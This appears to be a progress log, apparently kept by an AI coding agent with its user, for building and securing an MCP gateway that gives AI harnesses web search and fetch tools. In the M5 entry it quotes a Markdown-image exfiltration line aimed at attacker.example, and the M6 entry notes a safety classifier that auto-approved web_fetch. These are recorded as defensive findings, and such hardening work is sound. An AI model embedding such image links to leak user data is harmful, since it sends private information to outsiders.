# Progress

A dated log of what was done and decided, newest first. The plan and milestone status live in [plan.md](plan.md).

---

## 2026-11-05

- **Harnesses disconnected, the user's decision** ([ADR 0010](adr/0010-home-apps-only-for-now.md)). Only home apps call mcpgw
  for now. mcpgw is out of Claude Code's and Codex's configs. Removing its `/etc/hosts` line is the user's step, and until then
  its name still resolves on arch. A program on arch that deliberately targets the Service IP can still reach it; this is a
  choice about configuration, not a lock.
- **M7: mcpgw and llmgw reachable only from arch and the cluster,** the user's decision
  ([ADR 0008](adr/0008-only-arch-and-the-cluster-no-auth.md)), replacing LAN access.
  - **Why:** neither has a login, nothing outside arch needs them, any device on the network could use them, and llmgw's open
    CORS let web pages call it.
  - **Done:** every app uses the full Service name, llmgw 0.7.0 refuses other Host names and other sites' pages, and both
    Ingresses are gone. On arch, `/etc/hosts` points llmgw's full name at its Service IP, which is pinned in its chart.
  - **In a real browser on arch:** `http://llmgw.llmgw.svc.cluster.local/docs` renders, and its own requests work. A page from
    `homestorm.arch.internal` is refused by both gateways.
  - **Firewall rule written and tested in a throwaway network namespace:** a simulated LAN device reaches the Service and pod
    ranges without it and is blocked with it, while Traefik and arch itself keep working. Installing it is the user's step.
  - **Not tested from a real second device,** though Traefik's 404 was checked with the Host header such a device would send.
  - **Out of scope, the user's call:** the homenews iOS app, whose code isn't in its repo.
- **M6: mcpgw added to Claude Code and Codex.** Both connect at user level.
  - **Which search do they pick?** The built-in one, 4 of 4, on Claude Code and on Codex. The original finish line isn't met
    by default.
  - **What changes that:** one instruction worked on both. Turning the built-in off worked on Claude Code; on Codex,
    `web_search="disabled"` fell back to another hosted search (`codex_apps search_service.web_run`), not mcpgw.
  - **Why not force it:** with `web_fetch` not approved, mcpgw's answers were weaker. Codex ran 16 searches and said 18.4,
    where its built-in said 18.6. Claude Code couldn't confirm a version. These were unattended runs, one each. D12 is
    the user's call; the recommendation is to keep the built-ins and name mcpgw when wanted.
  - **A real gap:** in Claude Code's `auto` mode, the classifier approved `web_fetch` by itself, with no prompt. "Not on the
    allow list" isn't enough there, so it needs an `ask` rule. Auto mode refused to let me add it to the user's settings,
    which is fair, so it's the user's step. Tested per-run: with the rule, it's denied unattended.
  - **Codex:** `approval_mode = "prompt"` asks in a real interactive session ("Allow the mcpgw MCP server to run tool
    "web_fetch"?"), and refuses unattended.
  - **Services table** added to arch-infra's README.
- **M5 done: homestorm uses mcpgw,** in its own repo (M9 there, and its ADR 0014). A real meeting in a real browser against
  the real llmgw and mcpgw, then deployed. On the cluster: the migration landed with all 3 meetings and 42 messages intact,
  and homestorm's real client searched through mcpgw from its pod, and had a fetch of llmgw refused by name.
  - **Checking with thinking on changed the design:**
    - **`tool_choice: "none"`:** DeepSeek wrote its raw `<｜｜DSML｜｜tool_calls>` markup into the answer, and Claude Opus
      returned no text. So the forced final answer gets the research as plain text and no tools, which worked everywhere;
    - **`tool_choice: "required"`:** llmgw refuses it for thinking Claude models, so "must search" names `web_search`.
  - **A leak found on the way:** homestorm rendered Markdown images in answers, so a model could make the chair's browser
    send `![](https://attacker.example/?data=…)` with no click. Images in answers no longer load.
  - **Not checked:** a real meeting on the cluster, which needs the admin login.
- **M5 started: streaming tools checked through llmgw,** on Claude Haiku 5.5, GPT-5.6 Luna and DeepSeek Flash, with
  mcpgw's real tool schemas. `tool_calls` assemble from their deltas, `$schema` is accepted, `tool_choice: "required"`
  and `"none"` both work, the latter with tool history, which Claude needs. DeepSeek fetched `https://www.postgresql.org/`
  from memory alongside its search, which is the kind of URL the source rule exists to refuse.
- **M4 done: `web_fetch` on the cluster.**
  - **A real bug found by trying the worst case.** On the main thread, 5 MB of tags took 9.5 s and 1.3 GB, which would
    freeze every caller and get the pod killed. Pages are now parsed in workers with a memory cap and a time limit, so a
    hostile page costs only its own request. Six hostile inputs are in the tests, including ones aimed at quadratic
    regexes, and none stalled the main thread by more than 500 ms.
  - **The network layer holds.** From inside the pod with a plain `fetch`, the node, the router, llmgw (by name, service
    and pod), homestorm, the Kubernetes API and cloud metadata are all refused, while SearXNG and the public web work. A
    pod with no policy reaches those same addresses, so it's the policy doing it.
  - **Real pages.** 19 of 22 read in about half a second. Stack Overflow and Medium answer 403 to mcpgw's plain
    `User-Agent`; they're reported as refused rather than worked around. Cloudflare's sites and modelcontextprotocol.io
    answered `Accept: text/markdown` with clean Markdown.
  - **Found on real pages:** Readability keeps a scrap of a home page (NPR's 1 MB page gave 213 characters), so a short
    "article" now falls back to the whole page. Markdown documents take their title from the document.
  - **Readability stays.** Defuddle was 3–5× slower and not clearly better: ahead on GitHub READMEs, behind on Wikipedia
    and MDN.
  - **D11:** PDFs are refused with a clear message for now.
- **M3 done: `web_search` on SearXNG.** 21 queries from the home IP: results for all of them, mean 0.7 s, slowest 1.8 s.
  - **Engines from this IP:** Bing answered 14 queries and DuckDuckGo 11, with 3 CAPTCHAs. Brave answered 5 before "too
    many requests" suspended it, even with 1.5 s between queries. Google refused every query ("access denied"), so it's
    off. Bing's own default was off, so it's turned on.
  - **Weak spots:** niche technical queries ("how to pin dns lookup undici agent" led with Pinterest), and a location
    query got the wrong town. A nonsense query still returned results.
  - **D10:** no paid fallback for now. Worth another look after real use, since most of this rests on one engine.
  - **No Secret after all:** SearXNG's key signs nothing that outlives the pod, so the pod generates one at boot. That
    also removes the one manual step auto mode couldn't do.
- **M2 done: the skeleton is live** at http://mcpgw.arch.internal, deployed through arch-infra.
  - **Real harnesses through Traefik:** Claude Code and Codex both called the tool at the real hostname, logged as
    `claude-code/2.1.318` and `codex-mcp-client/0.166.0` with no configuration.
  - **Long-lived requests:** Traefik 3 has a 60 s read timeout by default, which looked like it might cut Claude Code's
    `subscriptions/listen`. It doesn't: replayed from what Claude Code really sends, it held for 330 s until the test
    ended it. The SDK sends a keepalive every 15 s.
  - **Not tested:** a second device. That's the user's to try: `curl http://mcpgw.arch.internal/health`.
  - **Open:** `ARCH_INFRA_TOKEN` isn't set on this repo, so CI skips the arch-infra tag bump, and tags are bumped by hand
    as on homestorm.
- **DNS:** `mcpgw.arch.internal` added by the user, and answered by the router.
- **M1 done: the repo is public.** The user made it public, since auto mode refuses to. Checked with no credentials:
  the repo page and the raw README both load. Next is M2.
- **Repo created, private at first:** `autumnfallenwang/mcpgw`, with README, plan, this log, ADRs 0001–0009, the updated
  design and the test scripts under `dev/`. It's plain Markdown docs only for now: no code, no devkit scaffold. Auto
  mode refused to create a public repo, so making it public is the user's step, and the last item in M1. It should
  happen before M2, because the cluster pulls images anonymously and GHCR images inherit the repo's visibility.
- **Three choices taken on the recommended side, not yet confirmed.** The user said to go ahead without picking
  between them, so the docs use the recommended option, and each is easy to change:
  - no REST mirror in v1 ([ADR 0005](adr/0005-mcp-only-no-rest-mirror.md));
  - `web_fetch` asks each time in harnesses
    ([ADR 0007](adr/0007-keeping-data-from-leaking-through-web-fetch.md));
  - no auth on the home network ([ADR 0008](adr/0008-only-arch-and-the-cluster-no-auth.md)). This one assumes only trusted
    devices share the network, which the user still needs to confirm.
- **Design corrected** after checking it against MCP `2026-07-28`, SDK v2, OWASP and vendor docs. The architecture
  held; the protocol details were a generation behind.
  - SDK: `@modelcontextprotocol/sdk` 1.x replaced by the v2 packages
    ([ADR 0003](adr/0003-mcp-sdk-v2-both-protocol-versions.md)).
  - Results: text plus `structuredContent` replaced by text plus `_meta`
    ([ADR 0004](adr/0004-text-results-app-data-in-meta.md)).
  - Added: Host and Origin settings, tool annotations, fetch rate limit, URL length limit, output cleaning,
    `ipaddr.js` instead of hand-written IP checks, NetworkPolicies
    ([ADR 0006](adr/0006-web-fetch-cannot-reach-home-network.md)), and the rule against data leaks
    ([ADR 0007](adr/0007-keeping-data-from-leaking-through-web-fetch.md)).
  - Fixed: the two sections that disagreed on whether "no results" is an error (it isn't), the Claude Desktop claim
    (custom connectors connect from Anthropic's cloud), `--scope user` on the Claude Code command, and the Service
    port (80, like llmgw).
  - Build order: the skeleton now deploys first ([plan.md](plan.md)).
- **SDK v2 tried with real harnesses** ([dev/harness-check/](../dev/harness-check/)). `server` 2.4.0, `hono` 2.0.2,
  `client` 2.4.0, Claude Code 2.1.318, Codex 0.166.0.
  - One endpoint served Claude Code at `2026-07-28` and Codex at `2025-06-18`; both called the tool.
  - `GET` and `DELETE` on `/mcp` answer 405 with no code of ours. Claude Code sends no `GET` on the new protocol; it
    sends a `subscriptions/listen` POST instead.
  - **Three setup traps found:**
    - a hostile `Origin` got a 200 until `allowedOrigins: []` was set;
    - a name not in `allowedHosts`, such as the in-cluster one, gets a 403;
    - `/health` on the MCP app refuses a pod-IP `Host`, so it goes on an outer app.
  - A named origin (`http://homestorm.arch.internal`) was also refused. Not investigated, since nothing in a browser
    should call mcpgw.
- **What a model actually receives,** read from Claude Code's delivered `tool_result`, using a test tool whose text
  block and `structuredContent` carried different prices.
  - Claude Code delivered only the JSON and dropped the text block. Codex's model saw both.
  - A text-only result reached both unchanged. `_meta` reached neither model, and Codex's client event showed it
    arriving.
- **Claude Code and Codex first tried against SDK 1.32.2,** plain HTTP to a non-loopback address, no auth. Both
  connected and quoted the made-up price.
  - `codex exec` refused the tool: "MCP tool call requires approval, but approval policy is never". Both
    `readOnlyHint: true` on the server and `tools.web_search.approval_mode="approve"` on the client fixed it.
    `readOnlyHint` means Codex then runs the tool without asking, which is why `web_fetch` gets a client setting
    ([ADR 0007](adr/0007-keeping-data-from-leaking-through-web-fetch.md)).
  - Claude Code held a `GET /mcp` stream open for the whole session on the old protocol.
- **Network facts checked:**
  - the router's DNS answers each `.arch.internal` name individually, with no wildcard. `mcpgw.arch.internal` doesn't
    resolve yet;
  - this machine (`aaron-desktop-arch`, 192.168.1.163) is the k3s node, and has no VPN;
  - k3s runs with no flag disabling network policies, and `argocd` already has some. Enforcement isn't proven yet.
- **Not tested yet:** Traefik, the real hostname, a second device, and Codex's `approval_mode = "prompt"`. All are on
  the plan (M2 and M6).
- **Research limits, for later:**
  - evidence on SearXNG reliability is forums and vendor posts, with no independent benchmark;
  - a July report says Anthropic closed a `web_fetch` leak by no longer following links inside fetched pages, while
    its current docs still list fetch results as an allowed URL source. The strict rule was chosen either way.

## 2026-11-04

- **Design written** ([design.md](design.md)): a tool gateway beside llmgw, with `web_search` through SearXNG and
  `web_fetch`, over MCP.
- **Tool loop tried with a fake MCP server** against the real llmgw
  ([dev/tool-loop-demo/](../dev/tool-loop-demo/)). Claude Haiku 5.5, GPT-5.6 Luna and DeepSeek Flash each chose to
  search for a price, wrote their own query and quoted the fake result. None searched for "Who wrote Hamlet?". Claude
  doubted the source, DeepSeek suggested cross-checking, and GPT stated it as fact, so sources must stay visible.
  Non-streaming calls only.
